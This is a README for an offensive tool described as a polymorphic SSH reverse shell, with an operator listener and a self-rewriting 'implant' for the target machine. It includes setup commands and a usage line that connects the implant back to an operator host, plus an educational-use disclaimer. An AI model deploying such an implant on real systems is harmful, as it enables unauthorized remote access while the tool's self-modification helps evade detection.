# anansi-shell

A polymorphic SSH reverse shell. The client rewrites parts of its own source after each session
and keeps working, while traffic travels inside an SSH channel.

**This tool is created for educational purposes only. Do not point it at systems for which you do not have explicit authorization.**


## Layout

    server.py     operator side: SSH listener and console
    client.py     target side: implant, rewrites itself

## Setup

    python3 -m venv .venv
    .venv/bin/pip install -r requirements.txt

## Usage

Start the operator server (generates a session password, prints the host
key fingerprint and listens on port 2222):

    .venv/bin/python server.py

On the target machine, point the client at it:

    .venv/bin/python client.py --host <server-ip> --password <password>


While a session is open, the server sends a ping every few seconds. Stop the client and the server returns to
listening mode.


## License

Released under the [MIT License](LICENSE).

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Mattias_N%C3%B5gols-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/mattias-n%C3%B5gols)
[![GitHub](https://img.shields.io/badge/GitHub-mattiasnogols-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mattiasnogols)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](https://opensource.org/licenses/MIT)